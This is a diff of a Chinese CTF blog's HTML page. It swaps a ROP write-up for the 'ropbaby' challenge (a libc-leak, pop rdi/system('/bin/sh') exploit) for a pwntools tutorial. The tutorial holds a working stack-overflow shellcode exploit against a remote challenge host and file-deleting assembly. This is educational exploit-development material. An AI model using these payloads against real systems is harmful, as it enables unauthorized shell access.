@@ -6,20 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://igk-dls.github.io">
-  <title>ROP (Return-oriented programming ) 返回导向编程 | 怪咖的小屋</title>
+  <title>Pythonpwn使用方法 | 怪咖的小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="ROP (Return-oriented programming ) 返回导向编程ROP(Return Oriented Programming)即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。">
-<meta name="keywords" content="pwn,ROP">
+  <meta name="description" content="Pythonpwn使用方法了解一下pwntools的一些常见用法。">
+<meta name="keywords" content="pwn,python">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ROP (Return-oriented programming ) 返回导向编程">
-<meta property="og:url" content="http://igk-dls.github.io/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/index.html">
+<meta property="og:title" content="Pythonpwn使用方法">
+<meta property="og:url" content="http://igk-dls.github.io/2019/09/10/Python-pwn使用方法/index.html">
 <meta property="og:site_name" content="怪咖的小屋">
-<meta property="og:description" content="ROP (Return-oriented programming ) 返回导向编程ROP(Return Oriented Programming)即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。">
+<meta property="og:description" content="Pythonpwn使用方法了解一下pwntools的一些常见用法。">
 <meta property="og:locale" content="zh">
-<meta property="og:updated_time" content="2019-09-10T11:02:23.085Z">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/Python-pwn使用方法/0de3cdb6d972dfb8fbc88e35fc4d36e0.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/Python-pwn使用方法/9075b03109db06effc5021ad08269d07.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/Python-pwn使用方法/1838d70fb3f9614721dd4efe9551c916.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/Python-pwn使用方法/1368de3c660aae209011eb00e1f46bb2.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/Python-pwn使用方法/09c4c9f5be43b6c0fefa5ce448f06a4d.png">
+<meta property="og:image" content="http://igk-dls.github.io/2019/09/10/Python-pwn使用方法/1c01dec99118cee6ee97d2eba68d2546.png">
+<meta property="og:updated_time" content="2019-09-12T10:51:57.144Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ROP (Return-oriented programming ) 返回导向编程">
-<meta name="twitter:description" content="ROP (Return-oriented programming ) 返回导向编程ROP(Return Oriented Programming)即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。">
+<meta name="twitter:title" content="Pythonpwn使用方法">
+<meta name="twitter:description" content="Pythonpwn使用方法了解一下pwntools的一些常见用法。">
+<meta name="twitter:image" content="http://igk-dls.github.io/2019/09/10/Python-pwn使用方法/0de3cdb6d972dfb8fbc88e35fc4d36e0.png">
   
     <link rel="alternative" href="/atom.xml" title="怪咖的小屋" type="application/atom+xml">
   
@@ -149,20 +156,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-ROP (Return-oriented programming ) 返回导向编程" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-Python-pwn使用方法" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      ROP (Return-oriented programming ) 返回导向编程
+      Pythonpwn使用方法
     </h1>
   
 
         
                 <!-- 不蒜子统计 -->        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次        </span>
-<a href="/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/" class="archive-article-date">
+<a href="/2019/09/10/Python-pwn使用方法/" class="archive-article-date">
   	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
 </a>
         
@@ -170,17 +177,27 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="ROP-Return-oriented-programming-返回导向编程"><a href="#ROP-Return-oriented-programming-返回导向编程" class="headerlink" title="ROP (Return-oriented programming ) 返回导向编程"></a>ROP (Return-oriented programming ) 返回导向编程</h3><p><code>ROP(Return Oriented Programming)</code>即面向返回地址编程，其主要思想是在栈缓冲区溢出的基础上，通过利用程序中<strong>已有的小片段(gadgets)</strong>来改变某些寄存器或者变量的值，从而改变程序的执行流程，达到预期利用目的。<a id="more"></a></p>
-<p>以<strong>实验吧 ropbaby</strong>为例：<br>![](ROP (Return-oriented programming ) 返回导向编程/d514bf7df4e170521042293fdc69e3d7.png)<br>简单的栈溢出利用，NX开了，那么就要用ROP了；开了PIE，就要想办法泄露出libc的基址，但这道题比较友好。<br>![](ROP (Return-oriented programming ) 返回导向编程/79671673cb3dbdc18b17630713a6fa10.png)</p>
-<p>那么<strong>利用思路</strong>就很简单了：寻找可以利用的ret，将栈布局为：无效字段*offset+p64(addr_ret)+p64(‘/bin/sh’)+p64(‘addr_system’)</p>
-<p>在memcpy完想要ret时，会ret到addr_ret的地址，然后将’/bin/sh’pop出来当作参数，在下一个ret时，ret到addr_system这里，因为已经布局好了其参数’/bin/sh’，所以相当于执行system(‘/bin/sh’)，拿到shell.</p>
-<p>首先<strong>寻找溢出点</strong>：<br>![](ROP (Return-oriented programming ) 返回导向编程/ee6566df7256098be4ab03686b8a9c8a.png)<br>经过验证,将nptr复制给savedregs时会发生溢出。<br>接着<strong>查找可控字段，计算偏移量</strong>。<br>![](ROP (Return-oriented programming ) 返回导向编程/bc4a38b47b5fb2858aa7c89ae1d80697.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/c8dbb3b018a921c371b140115253b52f.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/09c4d08f7fb7e50ef331935c777cf403.png)<br>偏移量为8<br>验证如下：<br>![](ROP (Return-oriented programming ) 返回导向编程/d9ce806250e3ab925ac3fbba9336c63a.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/2f1da7027901200e157d3edb9908815f.png)<br><strong>寻找libc中’/bin/sh’的偏移量</strong>(在32位机器上可以找到，我也不知道为什么64位不行)<br>![](ROP (Return-oriented programming ) 返回导向编程/5a73527385c79cd9bcbd0bc832ebaa92.png)<br>offset_binsh = 0x18cd17<br>接着需要<strong>查找所有的 ret</strong>，使用ROPgadget(32位可以，64不知道为什么不行)<br>![](ROP (Return-oriented programming ) 返回导向编程/b476dafead58d72a02f5a03b4ad48d63.png)<br>![](ROP (Return-oriented programming ) 返回导向编程/d7c675fffc61a43ce0238648eb20d885.png)</p>
-<p><strong>注意：</strong>64位参数先以寄存器为主，分别是rdi,rsi,rdx,rcx,r8,r9,栈；32位只有栈。该程序是64位，之后的system(‘/bin/sh’)只有一个参数，入rdi寄存器，所以找相应的指令:pop rdi;ret;</p>
-<p>![](ROP (Return-oriented programming ) 返回导向编程/cdc3b8cb24f2db99e422c98cba4c2cd4.png)<br>那么offset_rdi_ret = 0x21102<br><strong>拿到offset_system</strong><br>![](ROP (Return-oriented programming ) 返回导向编程/638d973dde12d491bf623f5a33a56383.png)<br>利用2可以拿到addr_system，然后addr_libc就可以计算出来了。</p>
-<p><strong>exp如下：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    s  =  remote(<span class="string">"106.2.25.7"</span>,  <span class="number">8004</span>)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] Start!'</span></span><br><span class="line">    s.recvuntil(<span class="string">':'</span>)</span><br><span class="line">    <span class="comment">#Get addr_system</span></span><br><span class="line">    s.sendline(<span class="string">'2'</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'Enter symbol: '</span>)</span><br><span class="line">    s.sendline(<span class="string">'system'</span>)</span><br><span class="line">    addr_system  =  int  (s.recvuntil(<span class="string">'\n'</span>)[<span class="number">14</span>:],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] addr_system is '</span>,addr_system</span><br><span class="line">    offset_system  =  <span class="number">0x45390</span></span><br><span class="line">    <span class="comment">#Calculate addr_libc</span></span><br><span class="line">    addr_libc  =  addr_system  -  offset_system</span><br><span class="line">    <span class="comment">#Make payload</span></span><br><span class="line">    s.sendline(<span class="string">'3'</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'(max 1024): '</span>)</span><br><span class="line">    <span class="comment">#8 + 8 + 8 + 8 =32</span></span><br><span class="line">    s.sendline(<span class="string">'32'</span>)</span><br><span class="line">    offset_binsh  =  <span class="number">0x18cd17</span></span><br><span class="line">    offset_rdi_ret  =  <span class="number">0x21102</span></span><br><span class="line">    addr_rdi_ret  =  addr_libc  +  offset_rdi_ret</span><br><span class="line">    addr_binsh  =  addr_libc  +  offset_binsh</span><br><span class="line"></span><br><span class="line">    payload  =<span class="string">'A'</span>  *  <span class="number">8</span>  +  p64(addr_rdi_ret)  +  p64(addr_binsh)  +  p64(addr_system)</span><br><span class="line"></span><br><span class="line">    s.sendline(payload)</span><br><span class="line">    s.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+        <h3 id="Pythonpwn使用方法"><a href="#Pythonpwn使用方法" class="headerlink" title="Pythonpwn使用方法"></a>Pythonpwn使用方法</h3><p>了解一下pwntools的一些常见用法。<a id="more"></a></p>
+<h4 id="基础用法："><a href="#基础用法：" class="headerlink" title="基础用法："></a><strong>基础用法：</strong></h4><p>以<strong>实验吧 pilot</strong>为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *  <span class="comment">#导入pwn</span></span><br><span class="line"><span class="comment">#remote建立远程连接，需要参数(ip,port)</span></span><br><span class="line"><span class="comment">#如果本地执行的话:</span></span><br><span class="line"><span class="comment">#p = process('./pilot')</span></span><br><span class="line">p  =  remote(<span class="string">"106.2.25.7"</span>,<span class="number">8003</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Location:'</span>)  <span class="comment">#接收信息直到出现关键字'Location'</span></span><br><span class="line">addr  =  int  (p.recvuntil(<span class="string">'\n'</span>)[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)  <span class="comment">#将之后接收到的信息的14位16进制数转成int存储起来</span></span><br><span class="line"><span class="keyword">print</span>  addr</span><br><span class="line"></span><br><span class="line">shellcode  =  <span class="string">'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#布局</span></span><br><span class="line">payload  =  shellcode  +  ((<span class="number">40</span>  -  len(shellcode))*<span class="string">'A'</span>)  +  p64(addr)</span><br><span class="line"><span class="comment">#接收信息直到出现关键字'Command:'</span></span><br><span class="line">p.recvuntil(<span class="string">'Command:'</span>)</span><br><span class="line"><span class="comment">#将payload发送出去</span></span><br><span class="line"><span class="comment">#p.sendline()发送之后默认在后面加换行</span></span><br><span class="line"><span class="comment">#p.sendline(payload)</span></span><br><span class="line">p.send(payload+<span class="string">'\n'</span>)</span><br><span class="line"><span class="comment">#与其进行交互</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">利用思路：cyclic 100计算溢出偏移长度,Location定位字符串开始的位置,布局为 shellcode+padding+addr</span></span><br><span class="line"><span class="string">执行到返回,劫持返回地址到addr,addr指向Location,即字符串开始的位置,之后执行shellcode,拿到shell</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#cat home/flag</span></span><br></pre></td></tr></table></figure>
 
-<p><strong>运行结果如下：</strong><br>![1534153380698.png](ROP (Return-oriented programming ) 返回导向编程/af92467f178d1d29a856801aace8c2ef.png)</p>
+<h4 id="shellcode生成操作-汇编转操作码-："><a href="#shellcode生成操作-汇编转操作码-：" class="headerlink" title="shellcode生成操作(汇编转操作码)："></a><strong>shellcode生成操作(汇编转操作码)：</strong></h4><p>以<strong>实验吧</strong>  <strong>加减乘除</strong>为例：<br><img src="/2019/09/10/Python-pwn使用方法/0de3cdb6d972dfb8fbc88e35fc4d36e0.png" alt><br>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">code  =  <span class="string">'''.global _start</span></span><br><span class="line"><span class="string">_start:</span></span><br><span class="line"><span class="string">jmp test1</span></span><br><span class="line"><span class="string">test2:</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">mov al, 0xa</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov al, 0x1</span></span><br><span class="line"><span class="string">xor ebx, ebx</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">test1:</span></span><br><span class="line"><span class="string">call test2</span></span><br><span class="line"><span class="string">.string "delfile" '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置环境</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">arch设置架构为x86</span></span><br><span class="line"><span class="string">os设置系统为linux</span></span><br><span class="line"><span class="string">endian设置大小端模式为小端</span></span><br><span class="line"><span class="string">word_size设置字长为32</span></span><br><span class="line"><span class="string">log_level设置日志输出等级为debug，这句话在调试的时候一般会设置，这样pwntools会将完整的io过程都打印下来，使得调试更加方便</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">context(arch  =  <span class="string">'x86'</span>,  os  =  <span class="string">'linux'</span>,  endian  =  <span class="string">'little'</span>,  word_size  =  <span class="number">32</span>,  log_level  =  <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将code编码输出</span></span><br><span class="line">shellcode  =  asm(code).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span>  shellcode</span><br><span class="line"><span class="keyword">print</span>  type(shellcode)</span><br><span class="line"><span class="comment">#格式化，加上'\x'</span></span><br><span class="line">r  =  <span class="string">''</span></span><br><span class="line">count  =  <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>  i  <span class="keyword">in</span>  shellcode:</span><br><span class="line">    <span class="keyword">if</span>  count  %  <span class="number">2</span>  ==  <span class="number">0</span>:</span><br><span class="line">        r  +=  <span class="string">r'\x'</span></span><br><span class="line">    r  +=  i</span><br><span class="line">    count  +=  <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span>  r</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：<br><img src="/2019/09/10/Python-pwn使用方法/9075b03109db06effc5021ad08269d07.png" alt><br>注意删掉<strong>\x00坏字符</strong>，提交拿到key值：<br><img src="/2019/09/10/Python-pwn使用方法/1838d70fb3f9614721dd4efe9551c916.png" alt></p>
+<h4 id="其他："><a href="#其他：" class="headerlink" title="其他："></a><strong>其他：</strong></h4><h5 id="在寻找溢出长度时："><a href="#在寻找溢出长度时：" class="headerlink" title="在寻找溢出长度时："></a><strong>在寻找溢出长度时：</strong></h5><p>#生成指定长度的不重复序列</p>
+<p>#cyclic 100</p>
+<p>#用于查找指定序列的偏移量</p>
+<p>#cyclic -l gaaa<br>使用截图如下：<br><img src="/2019/09/10/Python-pwn使用方法/1368de3c660aae209011eb00e1f46bb2.png" alt></p>
+<h5 id="ELF文件操作："><a href="#ELF文件操作：" class="headerlink" title="ELF文件操作："></a><strong>ELF文件操作：</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获得该ELF的句柄</span></span><br><span class="line"><span class="comment">#libc = ELF("/lib/x86_64-linux-gnu/libgcc_s.so.1");</span></span><br><span class="line"><span class="comment">#将jmp esp对应的汇编代码送给jmp_esp</span></span><br><span class="line"><span class="comment">#jmp_esp = asm("jmp esp")</span></span><br><span class="line"><span class="comment">#在libc中搜索对应的汇编代码，并将为该汇编代码的地址返回给jmp_eso_addr_offset</span></span><br><span class="line"><span class="comment">#jmp_esp_addr_offset=libc.search(jmp_esp).next()</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="自动生成shellcode"><a href="#自动生成shellcode" class="headerlink" title="自动生成shellcode"></a><strong>自动生成shellcode</strong></h5><p><img src="/2019/09/10/Python-pwn使用方法/09c4c9f5be43b6c0fefa5ce448f06a4d.png" alt></p>
+<h5 id="数据打包："><a href="#数据打包：" class="headerlink" title="数据打包："></a><strong>数据打包：</strong></h5><p>数据打包,即将整数值转换为32位或者64位地址一样的表示方式,比如0x400010表示为\x10\x00\x40一样,这使得我们构造payload变得很方便<br>用法：</p>
+<ul>
+<li>p32/p64: 打包一个整数,分别打包为32或64位</li>
+<li>u32/u64: 解包一个字符串,得到整数</li>
+</ul>
+<p>使用截图如下：<br><img src="/2019/09/10/Python-pwn使用方法/1c01dec99118cee6ee97d2eba68d2546.png" alt></p>
 
       
 	  
@@ -192,7 +209,7 @@
                 
                 <br>
                 <strong>本文链接：</strong>
-                http://igk-dls.github.io/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/
+                http://igk-dls.github.io/2019/09/10/Python-pwn使用方法/
                 <br>
                 <strong>版权声明：</strong>
                 本作品采用
@@ -245,7 +262,7 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ROP</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
         		</li>
       		
 		</ul>
@@ -301,7 +318,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://igk-dls.github.io/2019/09/10/ROP (Return-oriented programming ) 返回导向编程/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://igk-dls.github.io/2019/09/10/Python-pwn使用方法/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -315,18 +332,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/09/10/Python网络编程/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/09/10/Python-pexpect/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Python网络编程
+          Pythonpexpect
         
       </div>
     </a>
   
   
-    <a href="/2019/09/10/ROP之ret2dlresolve/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">ROP之ret2dlresolve</div>
+    <a href="/2019/09/10/Python-z3-solver/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Python z3-solver</div>
       <i class="icon-circle-right"></i>
     </a>
   
